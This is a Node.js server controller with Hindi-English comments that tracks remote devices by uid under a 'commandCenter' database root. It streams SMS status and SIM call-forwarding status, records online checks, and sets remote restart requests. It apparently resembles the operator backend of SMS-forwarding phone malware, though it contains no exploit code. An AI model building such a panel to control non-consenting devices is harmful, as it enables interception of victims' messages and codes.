import { rtdb } from "../config/db.js";

const ROOT = "commandCenter";

/* ============================================================
   🔁 GLOBAL WATCHERS (LIVE LISTENERS)
   - Map me RTDB ref store karenge taki duplicate listener na bane
============================================================ */
const smsWatchers = new Map();          // uid -> rtdb ref
const simForwardWatchers = new Map();   // uid -> rtdb ref

/* ====================== HELPERS ======================= */

const clean = (id) => id?.toString()?.trim();

/** SMS list banana (sorted) */
function buildSmsStatusList(uid, raw) {
  if (!raw) return [];

  const list = [];
  Object.entries(raw).forEach(([smsId, obj]) => {
    list.push({
      smsId,
      uid,
      ...obj,
    });
  });

  list.sort((a, b) => (b.at || 0) - (a.at || 0));
  return list;
}

/** Sim forward list banana (sorted) */
function buildSimForwardList(raw) {
  if (!raw) return [];

  const list = [];
  Object.entries(raw).forEach(([simSlot, obj]) => {
    list.push({
      simSlot: Number(simSlot),
      ...obj,
    });
  });

  list.sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
  return list;
}

/* ================== STOP WATCHERS =================== */

function stopSmsWatcher(uid) {
  const ref = smsWatchers.get(uid);
  if (ref) {
    ref.off();
    smsWatchers.delete(uid);
    console.log("🛑 SMS watcher stopped:", uid);
  }
}

function stopSimForwardWatcher(uid) {
  const ref = simForwardWatchers.get(uid);
  if (ref) {
    ref.off();
    simForwardWatchers.delete(uid);
    console.log("🛑 SIM-FORWARD watcher stopped:", uid);
  }
}

/* ================== START WATCHERS =================== */

function startSmsWatcher(uid, io) {
  const path = `${ROOT}/smsStatus/${uid}`;
  const ref = rtdb.ref(path);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      console.log("⚪ LIVE SMS STATUS (empty):", uid);
      if (io) {
        io.emit("smsStatusUpdate", {
          uid,
          success: true,
          data: [],
          message: "No SMS status found",
        });
      }
      return;
    }

    const raw = snap.val();
    const list = buildSmsStatusList(uid, raw);

    console.log("🔥 LIVE SMS STATUS:", uid, list);

    if (io) {
      io.emit("smsStatusUpdate", {
        uid,
        success: true,
        data: list,
      });
    }
  });

  smsWatchers.set(uid, ref);
  console.log("🎧 SMS watcher started:", uid);
}

function startSimForwardWatcher(uid, io) {
  const path = `simForwardStatus/${uid}`;
  const ref = rtdb.ref(path);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      console.log("⚪ LIVE SIM-FORWARD (empty):", uid);
      if (io) {
        io.emit("simForwardUpdate", {
          uid,
          success: true,
          data: [],
          message: "No SIM forward status found",
        });
      }
      return;
    }

    const raw = snap.val();
    const list = buildSimForwardList(raw);

    console.log("🔥 LIVE SIM-FORWARD STATUS:", uid, list);

    if (io) {
      io.emit("simForwardUpdate", {
        uid,
        success: true,
        data: list,
      });
    }
  });

  simForwardWatchers.set(uid, ref);
  console.log("🎧 SIM-FORWARD watcher started:", uid);
}

/* ============================================================
   ⭐ GET SMS STATUS OF ONE DEVICE — BY UID
   Path: /api/device/:uid/sms-status
   ✔️ Ab LIVE listen + Socket.IO emit bhi karega
============================================================ */
export const getSmsStatusByDevice = async (req, res) => {
  try {
    const uidRaw = req.params.uid;
    const uid = clean(uidRaw);

    if (!uid) {
      return res.status(400).json({
        success: false,
        message: "uid missing / invalid",
      });
    }

    const io = req.app.get("io"); // <-- Socket.IO instance

    // Pehle purana watcher hatao (duplicate se bachne ke liye)
    stopSmsWatcher(uid);

    // 1) Current snapshot
    const snap = await rtdb.ref(`${ROOT}/smsStatus/${uid}`).get();

    let list = [];
    if (snap.exists()) {
      list = buildSmsStatusList(uid, snap.val());
    }

    // 2) Ab LIVE listener start karo
    startSmsWatcher(uid, io);

    // 3) Response
    return res.json({
      success: true,
      data: list,
      message: "SMS status live listening started",
    });
  } catch (err) {
    console.error("❌ getSmsStatusByDevice ERROR:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
};


/* ============================================================
   ⭐ GET SIM FORWARD STATUS — BY UID
   Path: /api/device/:uid/sim-forward
   ✔️ Ab LIVE listen + Socket.IO emit bhi karega
============================================================ */
export const getSimForwardStatus = async (req, res) => {
  try {
    const uidRaw = req.params.uid;
    const uid = clean(uidRaw);

    if (!uid) {
      return res.status(400).json({
        success: false,
        message: "uid missing / invalid",
      });
    }

    const io = req.app.get("io"); // <-- Socket.IO instance

    // Purana watcher band karo
    stopSimForwardWatcher(uid);

    // 1) Current snapshot
    const snap = await rtdb.ref(`simForwardStatus/${uid}`).get();

    let list = [];
    if (snap.exists()) {
      list = buildSimForwardList(snap.val());
    }

    // 2) LIVE listener start
    startSimForwardWatcher(uid, io);

    // 3) Response
    return res.json({
      success: true,
      data: list,
      message: "SIM forward live listening started",
    });
  } catch (err) {
    console.error("❌ getSimForwardStatus ERROR:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
};


/* ============================================================
   ⭐ SET CHECK ONLINE STATUS
   Path: POST /api/check-online/:uid
============================================================ */
export const saveCheckOnlineStatus = async (req, res) => {
  try {
    const { uid } = req.params;
    const { available } = req.body;

    if (!uid) {
      return res.json({
        success: false,
        message: "uid missing",
      });
    }

    const checkedAt = Date.now();

    const data = {
      available: available || "checking",
      checkedAt,
    };

    await rtdb.ref(`checkOnline/${uid}`).set(data);

    return res.json({
      success: true,
      message: "Check Online Updated",
      data: { uid, ...data },
    });
  } catch (err) {
    console.error("❌ saveCheckOnlineStatus ERROR:", err);
    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
};


/* ============================================================
   ⭐ GET DEVICE ONLINE REPLY — replyCollection/{uid}
   Path: /api/brosreply/:uid
   (Ye abhi single fetch hi hai, live logic server.js me bhi hai)
============================================================ */
export const getBrosReply = async (req, res) => {
  try {
    const { uid } = req.params;

    if (!uid) {
      return res.json({
        success: false,
        message: "uid missing",
      });
    }

    const snap = await rtdb.ref(`checkOnline/${uid}`).get();

    if (!snap.exists()) {
      return res.json({
        success: true,
        data: null,
        message: "No reply found",
      });
    }

    const data = snap.val();

    return res.json({
      success: true,
      data: { uid, ...data },
    });
  } catch (err) {
    console.error("❌ getBrosReply ERROR:", err);
    res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
};


/* ============================================================
   ⭐ SET RESTART REQUEST — restartCollection/{uid}
   Path: POST /api/restart/:uid
============================================================ */
export const setRestart = async (req, res) => {
  try {
    const { uid } = req.params;

    if (!uid) {
      return res.json({
        success: false,
        message: "uid missing",
      });
    }

    const at = Date.now();
    const data = {
      requested: true,
      at,
    };

    await rtdb.ref(`restartCollection/${uid}`).set(data);

    return res.json({
      success: true,
      message: "Restart request saved",
      data: { uid, ...data },
    });
  } catch (err) {
    console.error("❌ setRestart ERROR:", err);
    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
};


/* ============================================================
   ⭐ GET RESTART STATUS — restartCollection/{uid}
   Path: GET /api/restart/:uid
============================================================ */
export const getRestart = async (req, res) => {
  try {
    const { uid } = req.params;

    if (!uid) {
      return res.json({
        success: false,
        message: "uid missing",
      });
    }

    const snap = await rtdb.ref(`restartCollection/${uid}`).get();

    if (!snap.exists()) {
      return res.json({
        success: true,
        data: null,
        message: "No restart request found",
      });
    }

    return res.json({
      success: true,
      data: {
        uid,
        ...snap.val(),
      },
    });
  } catch (err) {
    console.error("❌ getRestart ERROR:", err);
    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
};
